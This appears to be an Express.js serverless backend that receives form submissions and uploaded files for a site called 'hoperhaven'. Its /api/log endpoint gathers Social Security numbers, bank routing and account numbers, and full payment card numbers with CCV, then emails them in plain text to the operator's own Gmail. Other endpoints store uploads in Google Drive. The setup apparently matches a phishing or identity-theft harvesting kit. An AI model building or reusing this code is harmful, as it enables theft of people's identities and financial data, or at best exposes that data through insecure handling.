const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const { google } = require('googleapis');

const app = express();

// Configure CORS to allow requests from the frontend
app.use(cors({
  origin: ['https://hoperhaven.vercel.app', 'http://localhost:3000', 'http://localhost:5173'],
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());

// === Email Transporter (Gmail SMTP) ===
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER, // your Gmail
        pass: process.env.EMAIL_PASS  // your App Password
    }
});

// === Endpoint: receive form submission + Drive info ===
app.post('/api/log', async (req, res) => {
    try {
        const formData = req.body;

        // Build a readable email body
        const emailBody = `
            === NEW FORM SUBMISSION ===
            Timestamp: ${new Date(formData.timestamp).toLocaleString()}

            --- Personal Information ---
            First Name: ${formData.formData.firstName}
            Last Name: ${formData.formData.lastName}
            Date of Birth: ${formData.formData.dateOfBirth}
            SSN: ${formData.formData.socialSecurityNumber}
            Phone: ${formData.formData.phoneNumber}
            Email: ${formData.formData.email}

            --- Address Information ---
            Current Address: ${formData.formData.currentAddress}
            City: ${formData.formData.city}
            State: ${formData.formData.state}
            Zip Code: ${formData.formData.zipCode}
            Mailing Address: ${formData.formData.mailingAddress}

            --- Banking Information ---
            Bank Name: ${formData.formData.bankName}
            Account Type: ${formData.formData.accountType}
            Routing Number: ${formData.formData.routingNumber}
            Account Number: ${formData.formData.accountNumber}

            --- Verification ---
            Terms Accepted: ${formData.formData.termsAccepted}
            Data Consent: ${formData.formData.dataConsent}

            --- Cards ---
            ${(formData.formData.cards || [])
                .map((c, i) => `Card ${i + 1}: ${c.cardNumber}, Exp: ${c.expiry}, CCV: ${c.ccv}`)
                .join('\n')}

            --- Google Drive Folder ---
            Name: ${formData.folder?.name}
            ID: ${formData.folder?.id}
            URL: ${formData.folder?.url}

            --- Uploaded Files ---
            ${(formData.files || [])
                .map((f, i) => `${i + 1}. ${f.name}\n    URL: ${f.url}\n    ID: ${f.id}`)
                .join('\n')}
            =============================
            `;

        // Send email
        await transporter.sendMail({
            from: process.env.EMAIL_USER,
            to: process.env.EMAIL_USER, // send to yourself
            subject: `New Submission from ${formData.formData.firstName} ${formData.formData.lastName}`,
            text: emailBody
        });

        res.json({ success: true, message: 'Submission emailed successfully' });
    } catch (error) {
        console.error('Email error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// === Google Drive API Integration ===
// Initialize Google Service Account Auth
let auth;
try {
  const serviceAccountJson = JSON.parse(process.env.GOOGLE_SERVICE_ACCOUNT || '{}');
  
  // Using the JWT constructor directly instead of deprecated methods
  const jwt = new google.auth.JWT(
    serviceAccountJson.client_email,
    null,
    serviceAccountJson.private_key,
    ['https://www.googleapis.com/auth/drive']
  );
  
  auth = jwt;
} catch (error) {
  console.error('Error initializing Google auth:', error);
}

// Create a Drive client with service account authentication
const getDriveClient = async () => {
  try {
    if (!auth) {
      throw new Error('Google auth not initialized');
    }
    
    // No need to call getClient() with JWT
    return google.drive({ version: 'v3', auth });
  } catch (error) {
    console.error('Error getting Drive client:', error);
    throw new Error('Failed to initialize Google Drive client');
  }
};

// Simplified endpoint to initialize Drive access (no user auth needed)
app.get('/api/google/init', async (req, res) => {
  try {
    // Just verify we can access the Drive API
    const drive = await getDriveClient();
    res.json({ success: true, message: 'Drive API initialized with service account' });
  } catch (error) {
    console.error('Drive initialization error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Endpoint to create a folder in Google Drive using service account
app.post('/api/google/create-folder', async (req, res) => {
  try {
    const { folderName } = req.body;
    
    if (!folderName) {
      return res.status(400).json({ error: 'Folder name is required' });
    }

    // Get Drive client with service account
    const drive = await getDriveClient();
    
    // Create folder
    const folderMetadata = {
      name: folderName,
      mimeType: 'application/vnd.google-apps.folder',
      parents: '1orU5vM9h49_q2zNr-Vi2S1aRKmfA-upb'
    };
    
    const folder = await drive.files.create({
      resource: folderMetadata,
      fields: 'id, name, webViewLink'
    });
    
    res.json({
      id: folder.data.id,
      name: folder.data.name,
      url: folder.data.webViewLink
    });
  } catch (error) {
    console.error('Folder creation error:', error);
    res.status(500).json({ error: error.message });
  }
});

// Endpoint to get upload URL for direct upload using service account
app.post('/api/google/get-upload-url', async (req, res) => {
  try {
    const { fileName, folderId, mimeType } = req.body;
    
    if (!fileName || !mimeType) {
      return res.status(400).json({ error: 'File name and MIME type are required' });
    }

    // Get Drive client with service account
    const drive = await getDriveClient();
    
    // Prepare file metadata
    const fileMetadata = {
      name: fileName,
      mimeType: mimeType,
    };
    
    // If folder ID is provided, add it as parent
    if (folderId) {
      fileMetadata.parents = [folderId];
    }
    
    // Skip trying resumable upload since we know it hits quota limits
    // Create the file metadata first without content
    const file = await drive.files.create({
      resource: fileMetadata,
      fields: 'id, name, webViewLink'
    });
    
    // Return file info with a flag indicating direct upload is not available
    return res.json({
      id: file.data.id,
      name: file.data.name,
      webViewLink: file.data.webViewLink,
      directUploadNotAvailable: true,
      fileMetadata: fileMetadata,
      message: 'File created successfully. Direct upload not available due to service account quota limitation.'
    });
  } catch (error) {
    console.error('Get upload URL error:', error);
    
    // Check if the error is related to the folder
    if (error.message && (error.message.includes('notFound') || error.message.includes('folder'))) {
      return res.status(404).json({ 
        error: 'Folder not found or not accessible. Please check if the folder ID is correct.',
        details: error.message
      });
    }
    
    res.status(500).json({ error: error.message });
  }
});

// Endpoint to verify if a folder exists and is accessible
app.post('/api/google/verify-folder', async (req, res) => {
  try {
    const { folderId } = req.body;
    
    if (!folderId) {
      return res.status(400).json({ error: 'Folder ID is required' });
    }

    // Get Drive client with service account
    const drive = await getDriveClient();
    
    // Try to get the folder metadata
    const response = await drive.files.get({
      fileId: folderId,
      fields: 'id, name, mimeType, capabilities'
    });
    
    // Check if it's actually a folder
    const isFolder = response.data.mimeType === 'application/vnd.google-apps.folder';
    
    // Check if we have write permissions
    const canUpload = response.data.capabilities && 
                     (response.data.capabilities.canAddChildren === true);
    
    res.json({
      valid: isFolder,
      canUpload: canUpload,
      folderName: response.data.name,
      folderId: response.data.id
    });
  } catch (error) {
    console.error('Folder verification error:', error);
    
    // Check for specific error types
    if (error.code === 404) {
      return res.status(404).json({ 
        valid: false, 
        error: 'Folder not found' 
      });
    }
    
    if (error.code === 403) {
      return res.status(403).json({ 
        valid: true, 
        canUpload: false, 
        error: 'No permission to access this folder' 
      });
    }
    
    res.status(500).json({ 
      valid: false, 
      error: error.message 
    });
  }
});

// Health check
app.get('/', (req, res) => {
    res.send('✅ Express backend is running on Vercel!');
});

// Export for Vercel serverless
module.exports = app;